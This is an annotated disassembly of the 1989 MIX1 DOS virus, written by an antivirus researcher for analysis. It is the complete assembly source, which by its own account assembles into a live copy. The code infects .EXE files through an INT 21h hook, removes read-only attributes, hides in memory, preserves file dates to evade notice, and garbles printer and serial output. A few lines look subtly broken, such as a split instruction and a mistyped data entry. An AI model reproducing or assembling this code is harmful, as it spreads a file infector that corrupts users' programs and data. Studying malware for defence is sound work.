;        THE MIX1 virus
;
;        It was first detected in Israel in August '89.
;
;        Disassembly done Sept. 24-25 '89.
;
;        The author of this program is unknown, but it is clearly a
;        modification of the "Icelandic" virus, with considerable
;        additions
;
;        All comments in this file were added by Fridrik Skulason,
;        University of Iceland/Computing Services.
;
;        INTERNET:     frisk@rhi.hi.is
;        UUCP:         ...mcvax!hafro!rhi!frisk
;        BIX:          FRISK
;
;        To anyone who obtains this file - please be careful with it, I
;        would not like to see this virus be distributed too much.
;
;        A short description of the virus:
;
;        It only infects .EXE files. Infected files grow by ... to ... bytes.
;        The virus attaches itself to the end of the programs it infects.
;
;        When an infected file is run, the virus copies itself to top of
;        free memory, and modifies the memory blocks, in order to hide from
;        memory mapping programs. Some programs may overwrite this area,
;        causing the computer to crash.
;
;        The virus will hook INT 21H and when function 4B (EXEC) is called
;        it sometimes will infect the program being run. It will check every
;        tenth program that is run for infection, and if it is not already
;        infected, it will be.
;
;        The virus will remove the Read-Only attribute before trying to
;        infect programs.
;
;        Infected files can be easily recognized, since they always end in
;        "MIX1"
;
;        To check for system infection, a byte at 0:33C is used - if it
;        contains 77 the virus is installed in memory.
;
;
VIRSIZ        EQU        128
 
;
;       This is the original program, just used so this file, when
;       assembled, will produce an active copy.
;
_TEXT1        SEGMENT        PARA PUBLIC
_START        DB        0b4H,09H
        PUSH        CS
        POP        DS
        MOV        DX,OFFSET STRING
        INT        21H
        MOV        AX,4C00H
        INT        21H
STRING        DB        "Hello world!",0dh,0ah,"$"
 _TEXT1        ENDS
 
CODE SEGMENT PARA PUBLIC 'CODE'
        ASSUME CS:CODE,DS:NOTHING,SS:NOTHING,ES:NOTHING
 
;
;         The virus is basically divided in the following parts.
;
;        1. The main program - run when an infected program is run.
;           It will check if the system is already infected, and if not
;           it will install the virus.
;
;        2. The new INT 17 handler. All outgoing characters will be garbled.
;
;        3. The new INT 14 handler. All outgoing characters will be garbled.
;
;        4. The new INT 8 handler.
;
;        5. The new INT 9 handler. Disables the Num-Lock key
;
;        6. The new INT 21 handler. It will look for EXEC calls, and
;           (sometimes) infect the program being run.
;
;       Parts 1 and 6 are almost identical to the Icelandic-1 version
;
;        This is a fake MCB
;
        DB        'Z',00,00,VIRSIZ,0,0,0,0,0,0,0,0,0,0,0,0
 
VIRUS   PROC    FAR
;
;        The virus starts by pushing the original start address on the stack,
;        so it can transfer control there when finished.
;
ABRAX:  DEC     SP              ; This used to be SUB SP,4
        DEC     SP
        NOP
        DEC     SP
        DEC     SP
        PUSH    BP
        MOV     BP,SP
        NOP                     ; added
        PUSH    AX
        NOP                     ; added
        MOV     AX,ES
;
;        Put the the original CS on the stack. The ADD AX,data instruction
;        is modified by the virus when it infects other programs.
;
        DB      05H
ORG_CS  DW      0010H
        MOV     [BP+4],AX
;
;        Put the the original IP on the stack. This MOV [BP+2],data instruction
;        is modified by the virus when it infects other programs.
;
        DB      0C7H,46H,02H
ORG_IP  DW      0000H
;
;        Save all registers that are modified.
;
        PUSH    ES
        PUSH    DS
        PUSH    BX
        PUSH    CX
        PUSH    SI
        PUSH    DI
;
;        Check if already installed. Quit if so.
;
        MOV        AX,0                 ; Was: XOR AX,AX
        MOV        ES,AX
        CMP        ES:[33CH],BYTE PTR 077H
        JNE        L1
;
;        Restore all registers and return to the original program.
;
EXIT:   POP        DI
        POP        SI
        POP        CX
        POP        BX
        POP        DS
        POP        ES
        POP        AX
        POP        BP
        RET
;
;    The virus tries to hide from detection by modifying the memory block it
;    uses, so it seems to be a block that belongs to the operating system.
;
;    It looks rather weird, but it seems to work.
;
L1:     MOV     AH,52H
        INT     21H
        MOV     AX,ES:[BX-2]
        MOV     ES,AX
        PUSH    ES                      ; Two totally unnecessary instructions
        POP     AX                      ; added
        ADD     AX,ES:[0003]
        INC     AX
        INC     AX
        MOV     CS:[0001],AX
;
;         Next, the virus modifies the memory block of the infected program.
;         It is made smaller, and no longer the last block.
;
        MOV     BX,DS
        DEC     BX
        PUSH    BX                      ; Unnecessary addition
        POP     AX
        MOV     DS,BX
        MOV     AL,'M'
        MOV     DS:[0000],AL
        MOV     AX,DS:[0003]
        SUB     AX,VIRSIZ
        MOV     DS:[0003],AX
        ADD     BX,AX
        INC     BX
;
;         Then the virus moves itself to the new block.
;
        PUSH    BX                      ; Was: MOV ES,BX
        POP     ES
        MOV     SI,0                    ; Was: XOR SI,SI    XOR DI,DI
        MOV     DI,SI
        PUSH    CS
        POP     DS
        MOV     CX,652H
        CLD
        REP     MOVSB
;
;        The virus then transfers control to the new copy of itself.
;
        PUSH     ES
        MOV      AX,OFFSET L3
        PUSH     AX
        RET
;
;       Zero some variables
;
L3:     MOV     BYTE PTR CS:[MIN60],0
        NOP
        MOV     BYTE PTR CS:[MIN50],0
        NOP
        MOV     WORD PTR CS:[TIMER],0
;
;       The most nutty way to zero ES register that I have ever seen:
;
        MOV     BX,0FFFFH
        ADD     BX,3F3FH
        MOV     CL,0AH
        SHL     BX,CL
        AND     BX,CS:[CONST0]
        MOV     AX,BX
        MOV     ES,AX
;
;       Set flag to confirm installation
;
        MOV     BYTE PTR ES:[33CH],77H
;
;       Hook interrupt 21:
;
        MOV        AX,ES:[0084H]
        MOV        CS:[OLD21],AX
        MOV        AX,ES:[0086H]
        MOV        CS:[OLD21+2],AX
        MOV        AX,CS
        MOV        ES:[0086H],AX
        MOV        AX,OFFSET NEW21
        MOV        ES:[0084H],AX
;
;       Hook interrupt 17:
;
        MOV        AX,ES:[005CH]
        MOV        CS:[OLD17],AX
        MOV        AX,ES:[005EH]
        MOV        CS:[OLD17+2],AX
        MOV        AX,CS
        MOV        ES:[005EH],AX
        MOV        AX,OFFSET NEW17
        MOV        ES:[005CH],AX
;
;       Hook interrupt 14:
;
        MOV        AX,ES:[0050H]
        MOV        CS:[OLD17],AX
        MOV        AX,ES:[0052H]
        MOV        CS:[OLD14+2],AX
        MOV        AX,CS
        MOV        ES:[0052H],AX
        MOV        AX,OFFSET NEW14
        MOV        ES:[0050H],AX
;
;
;
        CMP     WORD PTR CS:[NOINF],5
        JG      HOOK9
        JMP     EXIT
;
;       Hook interrupt 9
;
HOOK9:  MOV        AX,ES:[0024H]
        MOV        CS:[OLD9],AX
        MOV        AX,ES:[0026H]
        MOV        CS:[OLD9+2],AX
        MOV        AX,CS
        MOV        ES:[0026H],AX
        MOV        AX,OFFSET NEW9
        MOV        ES:[0024H],AX
;
;       Hook interrupt 8
;
        MOV        AX,ES:[0020H]
        MOV        CS:[OLD8],AX
        MOV        AX,ES:[0022H]
        MOV        CS:[OLD8+2],AX
        MOV        AX,CS
        MOV        ES:[0022H],AX
        MOV        AX,OFFSET NEW8
        MOV        ES:[0020H],AX
        JMP        EXIT
;
;       Video processing
;
VID:    PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    DI
        PUSH    DS
        PUSH    ES
        PUSH    CS
        POP     DS
        MOV     AH,0FH
        INT     10H
        MOV     AH,6
        MUL     AH
        MOV     BX,AX
        MOV     AX,DS:[BX+OFFSET VIDEOT]
        MOV     CX,DS:[BX+OFFSET VIDEOT+2]
        MOV     DX,DS:[BX+OFFSET VIDEOT+4]
        MOV     ES,DX
        SHR     CX,1
        MOV
        DI,1
        CMP     AX,0
        JNZ     V1
V0:     INC     WORD PTR ES:[DI]
        INC     DI
        INC     DI
        LOOP    V0
        JMP     SHORT V2
        NOP
V1:     NOT     WORD PTR ES:[DI]
        INC     DI
        INC     DI
        LOOP    V1
V2:     POP     ES
        POP     DS
        POP     DI
        POP     DX
        POP     CX
        POP     BX
        POP     AX
        RET
;
;       INT 9 replacement: Just fiddle around with the NUM-LOCK etc.
;       This routine does not become active until 50 minutes after
;       the execution of an infected program.
;
NEW9:   PUSH    AX
        PUSH    ES
        CMP     BYTE PTR CS:[MIN50],1
        JNZ     RETX1
        XOR     AX,AX
        MOV     ES,AX                           ; was xxxxxxxx
        AND     BYTE PTR ES:[417H],0BFH         ;     x0xxxxxx
        OR      BYTE PTR ES:[417H],20H          ;     x01xxxxx
        TEST    BYTE PTR ES:[417H],0CH
        JZ      RETX1
        IN      AL,60
        CMP     AL,53
        JNZ     RETX1
        AND     BYTE PTR ES:[417H],0F7H
;
;       This seems to be an error - the virus uses a FAR call, which will
;       probably cause the computer to crash.
;
        DB      9AH
        DW      OFFSET VID,171CH
;
;       This needs more checking.
;
 
RETX1:  POP     ES
        POP     AX
        DB      0EAH
OLD9    DW      0,0
;
;       New INT 14 routine - garble all outgoing characters
;
NEW14:  CMP     AH,1
        JZ      S1
DO14:   DB      0EAH
OLD14   DW      0,0
S1:     PUSH    BX
        XOR     BX,BX
        MOV     BL,AL
        ADD     BX,OFFSET ERRTAB
        MOV     AL,CS:[BX]              ; use old character as index into table
        POP     BX
        JMP     DO14
;
;       New INT 8 routine
;
NEW8:   PUSH    DX
        PUSH    CX
        PUSH    BX
        PUSH    AX
        CMP     BYTE PTR CS:[MIN60],01          ; If counter >= 60 min.
        JZ      TT0                             ; No need to check any more
        INC     WORD PTR CS:[TIMER]             ; else increment timer
        CMP     WORD PTR CS:[TIMER],-10         ; 60 minutes ?
        JZ      TT1
        CMP     WORD PTR CS:[TIMER],54600       ; 50 minutes ?
        JZ      TT2
        JMP     TXEX
;
;       50 minutes after an infected program is run the flag is set.
;
TT2:    MOV     BYTE PTR CS:[MIN50],1
        NOP
        JMP     TXEX
;
;       60 minutes after an infected program is run we start the ball bouncing.
;
TT1:    MOV     BYTE PTR CS:[MIN60],1
;
;       Get current cursor position and save it
;
        MOV     AH,3
        MOV     BH,0
        INT     10H
        MOV     CS:[SCRLINE],DH
        MOV     CS:[SCRCOL],DL
;
;       Set cursor position
;
        MOV     AH,2
        MOV     BH,0
        MOV     DH,CS:[MYLINE]
        MOV     DL,CS:[MYCOL]
        INT     10H
;
;       Check what is there and store it
;
        MOV     AH,8
        MOV     BH,0
        INT     10H
        MOV     CS:[ONSCREEN],AL
;
;       Set cursor position back as it was before
;
        MOV     AH,2
        MOV     BH,0
        MOV     DH,CS:[SCRLINE]
        MOV     DL,CS:[SCRCOL]
        INT     10H
;
;       Get current video mode and store it
;
        MOV     AH,0FH
        INT     10H
        MOV     CS:[VMODE],AH
;
;       Exit interrupt routine
;
        JMP     TXEX
;
;       Every time an INT 8 occurs, after the 60 min. have passed, we
;       end up here:
;
;       First get current cursor position
;
TT0:    MOV     AH,3
        MOV     BH,0
        INT     10H
        MOV     CS:[SCRLINE],DH
        MOV     CS:[SCRCOL],DL
;
;       Then set it to last position of ball.
;
        MOV     AH,2
        MOV     BH,0
        MOV     DH,CS:[MYLINE]
        MOV     DL,CS:[MYCOL]
        INT     10H
;
;       Write previous character there ...
;
        MOV     AH,0EH
        MOV     AL,CS:[ONSCREEN]
        MOV     BX,0
        INT     10H
;
;
        CMP     BYTE PTR CS:[UPDOWN],0
        JZ      T2
;
;
        DEC     BYTE PTR CS:[MYLINE]
        JMP     SHORT T3
        NOP
T2:     INC     BYTE PTR CS:[MYLINE]
T3:     CMP     BYTE PTR CS:[LEFTRIGHT],0
        JZ      T4
        DEC     BYTE PTR CS:[MYCOL]
        JMP     SHORT T5
        NOP
T4:     INC     BYTE PTR CS:[MYCOL]
;
;       Get current video mode
;
T5:     MOV     AH,0FH
        INT     10H
        MOV     CS:[VMODE],AH
        MOV     AL,CS:[MAXLIN]
        CMP     CS:[MYLINE],AL                  ; bottom of screen ?
        JNZ     T6
;
;       Reached bottom - now go upwards.
;
        NOT     BYTE PTR CS:[UPDOWN]
T6:     CMP     BYTE PTR CS:[MYLINE],0          ; reached the top ?
        JNZ     T7
;
;       Reached top - now go downwards
;
        NOT     BYTE PTR CS:[UPDOWN]
T7:     MOV     AL,CS:[VMODE]
        CMP     CS:[MYCOL],AL
        JNZ     T8
        NOT     BYTE PTR CS:[LEFTRIGHT]
T8:     CMP     BYTE PTR CS:[MYCOL],0
        JNZ     T9
        NOT     BYTE PTR CS:[LEFTRIGHT]
;
;       Set cursor position to new position of ball
;
T9:     MOV     AH,02
        MOV     BH,0
        MOV     DH,CS:[MYLINE]
        MOV     DL,CS:[MYCOL]
        INT     10H
;
;       Get what is there and store it.
;
        MOV     AH,8
        MOV     BH,0
        INT     10H
        MOV     CS:[ONSCREEN],AL
;
;       Write character (lower case o)
;
        MOV     AH,0EH
        MOV     AL,6FH
        MOV     BX,0
        INT     10H
;
;       And restore cursor position
;
        MOV     AH,02
        MOV     BH,0
        MOV     DH,CS:[SCRLINE]
        MOV     DL,CS:[SCRCOL]
        INT     10H
;
;       Restore registers and quit
;
TXEX:   POP     AX
        POP     BX
        POP     CX
        POP     DX
        DB      0EAH
OLD8    DW      0,0
;
;       New INT 17 routine. Garble all outgoing characters.
;
NEW17:  CMP     AH,0
        JZ      P0
DO17:   DB      0EAH
OLD17   DW      0,0
P0:     PUSH    BX
        XOR     BX,BX
        MOV     BL,AL
        ADD     BX,OFFSET ERRTAB
        MOV     AL,CS:[BX]
        POP     BX
        JMP     DO17
;
;        This is the INT 21 replacement. It only does something in the case
;        of an EXEC call.
;
NEW21:  CMP    AH,4BH
        JE     L5
DO21:   DB     0EAH
OLD21   DW     0,0
;
;       The code to only infect every tenth program has been removed
;
L5:     PUSH        AX
        PUSH        BX
        PUSH        CX
        PUSH        DX
        PUSH        SI
        PUSH        DS
;
;        Search for the file name extension ...
;
        MOV        BX,DX
L6:     INC        BX
        CMP        BYTE PTR [BX],'.'
        JE         L8
        CMP        BYTE PTR [BX],0
        JNE        L6
;
;        ... and quit unless it starts with "EX".
;
L7:     POP        DS
        POP        SI
        POP        DX
        POP        CX
        POP        BX
        POP        AX
        JMP        DO21
L8:     INC        BX
        CMP        WORD PTR [BX],5845H
        JNE        L7
;
;        When an .EXE file is found, the virus starts by turning off
;        the read-only attribute. The read-only attribute is not restored
;        when the file has been infected.
;
        MOV        AX,4300H                ; Get attribute
        INT        21H
        JC         L7
        MOV        AX,4301H                ; Set attribute
        AND        CX,0FEH
        INT        21H
        JC         L7
;
;        Next, the file is examined to see if it is already infected.
;         The signature (4418 5F19) is stored in the last two words.
;
        MOV        AX,3D02H                ; Open / write access
        INT        21H
        JC         L7
        MOV        BX,AX                        ; file handle in BX
;
;       This part of the code is new: Get date of file.
;
        MOV     AX,5700H
        INT     21H
        JC      L9
        MOV     CS:[DATE1],DX
        MOV     CS:[DATE2],CX
;
        PUSH    CS                        ; now DS is no longer needed
        POP     DS
;
;        The header of the file is read in at [ID+8]. The virus then
;        modifies itself, according to the information stored in the
;        header. (The original CS and IP addressed are stored).
;
        MOV        DX,OFFSET ID+8
        MOV        CX,1CH
        MOV        AH,3FH
        INT        21H
        JC        L9
        MOV        AX,DS:ID[1CH]
        MOV        DS:[ORG_IP],AX
        MOV        AX,DS:ID[1EH]
        ADD        AX,10H
        MOV        DS:[ORG_CS],AX
;
;        Next the read/write pointer is moved to the end of the file-4,
;        and the last 4 bytes read. They are compared to the signature,
;        and if equal nothing happens.
;
        MOV        AX,4202H
        MOV        CX,-1
        MOV        DX,-4
        INT        21H
        JC        L9
        ADD        AX,4
        MOV        DS:[LEN_LO],AX
        JNC        L8A
        INC        DX
L8A:    MOV        DS:[LEN_HI],DX
;
;       This part of the virus is new - check if it is below minimum length
;
        CMP     DX,0
        JNE     L8B
        MOV     CL,13
        SHR     AX,CL
        CMP     AX,0
        JG      L8B
        JMP     SHORT L9
        NOP
L8B:    MOV        AH,3FH
        MOV        CX,4
        MOV        DX,OFFSET ID+4
        INT        21H
        JNC        L11
L9:     MOV        AH,3EH
        INT        21H
L10:    JMP        L7
;
;        Compare to 4418,5F19
;
L11:    MOV        SI,OFFSET ID+4
        MOV        AX,[SI]
        CMP        AX,494DH
        JNE        L12
        MOV        AX,[SI+2]
        CMP        AX,3158H
        JE        L9
;
;        The file is not infected, so the next thing the virus does is
;        infecting it. First it is padded so the length becomes a multiple
;        of 16 bytes. Tis is probably done so the virus code can start at a
;        paragraph boundary.
;
L12:    MOV        AX,DS:[LEN_LO]
        AND        AX,0FH
        JZ        L13
        MOV        CX,16
        SUB        CX,AX
        ADD        DS:[LEN_LO],CX
        JNC        L12A
        INC        DS:[LEN_HI]
L12A:   MOV        AH,40H
        INT        21H
        JC        L9
;
;        Next the main body of the virus is written to the end.
;
L13:    MOV     DX,0                    ; Was:   XOR        DX,DX
        MOV        CX,OFFSET ID + 4
        MOV        AH,40H
        INT        21H
        JC        L9
;
;        Next the .EXE file header is modified:
;
        JMP     SHORT   F0              ; some unnecessary instructions
        NOP
;        First modify initial IP
;
F0:     MOV        AX,OFFSET LABEL
        MOV        DS:ID[1CH],AX
;
;        Modify starting CS = Virus CS. It is computed as:
;
;        (Original length of file+padding)/16 - Start of load module
;
        MOV        DX,DS:[LEN_HI]
        MOV        AX,DS:[LEN_LO]
        MOV        CL,CS:[CONST1]               ; Modified a bit
        SHR        DX,CL
        RCR        AX,CL
        SHR        DX,CL
        RCR        AX,CL
        SHR        DX,CL
        RCR        AX,CL
        SHR        DX,CL
        RCR        AX,CL
        SUB        AX,DS:ID[10H]
        MOV        DS:ID[1EH],AX
;
;        Modify length mod 512
;
        ADD        DS:[LEN_LO],OFFSET ID+4
        JNC        L14
        INC        DS:[LEN_HI]
L14:    MOV        AX,DS:[LEN_LO]
        AND        AX,511
        MOV        DS:ID[0AH],AX
;
;        Modify number of blocks used
;
        MOV        DX,DS:[LEN_HI]
        MOV        AX,DS:[LEN_LO]
        ADD        AX,511
        JNC        L14A
        INC        DX
L14A:   MOV        AL,AH
        MOV        AH,DL
        SHR        AX,1
        MOV        DS:ID[0CH],AX
;
;        Finally the modified header is written back to the start of the
;        file.
;
QQQ:    MOV        AX,4200H
        MOV     CX,0                    ; was XOR CX,CX
        AND     DX,CS:[CONST0]          ; was XOR DX,DX
        INT        21H
        JC        ENDIT
        MOV        AH,40H
        MOV        DX,OFFSET ID+8
        MOV        CX,1CH
        INT        21H
;
;       This part is new:       Restore old date.
;
        MOV     DX,CS:[DATE1]
        MOV     CX,CS:[DATE2]
        MOV     AX,5701H
        INT     21H
        JC      ENDIT
        INC     WORD PTR CS:[NOINF]
;
;        Infection is finished - close the file and execute it
;
ENDIT:  JMP        L9
;
;
        DW      0
 
VIDEOT: DW      0000H,  07D0H,  0B800H
        DW      0000H,  07D0H,  0B800H
        DW      0000H,  0FA0H,  0B800H
        DW      0000H,  0FA0H,  0B800H
        DW      0001H,  4000H,  0B800H
        DW      0001H,  4000H,  0B800H
        DW      0001H,  4000H,  0B800H
        DW      0000H,  0FA0H,  0B000H
        DW      0001H,  3E80H,  0B000H
        DW      0001H,  7D00H,  0B000H
        DW      0001H,  7D00H,  0B000H
        DW      0002H,  0000H,   0000H
        DW      0002H,  0000H,   0000H
        DW      0001H,  7D00H,  0A000H
        DW      0001H,  0FA00H, 0A000H
        DW      0001H,  6D60H,  0A000H
        DW      0002H,  0000H.  0000H
 
        DW      0
 
ERRTAB  DB      00H,01H,02H,03H,04H,05H,06H,07H,08H,09H,0BH,0AH,0CH,0DH,0EH,0FH
        DB      10H,11H,12H,13H,14H,15H,16H,17H,18H,19H,1BH,1AH,1CH,1DH,1FH,1EH
        DB      20H,21H,22H,23H,24H,25H,26H,27H,29H,28H,2AH,2DH,2CH,2BH,2EH,2FH
        DB      30H,31H,32H,33H,34H,35H,36H,37H,38H,39H,3AH,3BH,3EH,3DH,3CH,3FH
        DB      40H,42H,45H,43H,44H,41H,50H,47H,48H,59H,4AH,4BH,4CH,4DH,4EH,55H
        DB      46H,51H,52H,53H,54H,4FH,56H,57H,58H,49H,5AH,5DH,5CH,5BH,5EH,5FH
        DB      60H,65H,62H,73H,64H,61H,70H,67H,68H,65H,6AH,6BH,6CH,6DH,6EH,75H
        DB      66H,71H,72H,63H,74H,6FH,76H,77H,78H,79H,7AH,7DH,7CH,7BH,7EH,7FH
        DB      92H,81H,82H,83H,84H,85H,86H,8BH,9AH,89H,8AH,87H,8CH,8DH,8EH,8FH
        DB      90H,99H,80H,93H,94H,95H,96H,97H,98H,91H,88H,9BH,9CH,9DH,9EH,9FH
        DB      0A0H,0A1H,0A2H,0A3H,0A4H,0A5H,0A6H,0A7H,0A8H,0A9H,0BBH,0ABH,0ACH
        DB      0B0H,0B1H,0B2H,0B3H,0B4H,0B5H,0B6H,0B7H,0B8H,0B9H,0BAH,0AAH,0D9H
        DB      0C8H,0C1H,0C2H,0C3H,0C4H,0C5H,0C6H,0C7H,0C0H,0A9H,0CAH,0CBH,0CCH
        DB      0D0H,0D1H,0D2H,0D3H,0D4H,0D5H,0D6H,0D7H,0D8H,0BCH,0DAH,0DBH,0DCH
        DB      0E0H,0E1H,0E2H,0E3H,0E4H,0E5H,0E6H,0E7H,0E8H,0E9H,0EAH,0EBH,0ECH
        DB      0F0H,0F1H,0F2H,0F3H,0F4H,0F5H,0F6H,0F7H,0F8H,0F9H,0FAH,0FBH,0FCH
 
CONST1  DB      1       ; Just the constant 1
CONST0  DW      0       ; The label says it all
MIN60   DB      0       ; Flag, set to 1 60 minutes after execution
MIN50   DB      0       ; Flag, set to 1 50 minutes after execution
VMODE   DB      0       ; Video mode
MAXLIN  DB      24
MYCOL   DB      0       ; Position of ball on screen
MYLINE  DB      0       ; ditto.
ONSCREEN DB     ?       ; Previous character on the screen
UPDOWN  DB      0       ; Direction of ball (up or down)
LEFTRIGHT DB    0       ; Direction (left or right)
SCRCOL  DB      ?
SCRLINE DB      ?
DATE1   DW      ?       ; Date of file
DATE2   DW      ?       ; ditto.
TIMER   DW      0       ; Number of timer (INT 8) ticks
LEN_LO  DW      ?
LEN_HI  DW      ?
NOINF   DW      0       ; Number of infections
ID      ABRAX WORD
        DB      "MIX1"  ; The signature of the virus.
;
;        A buffer, used for data from the file.
;
 
VIRUS   ENDP
CODE        ENDS
 
        END ABRAX
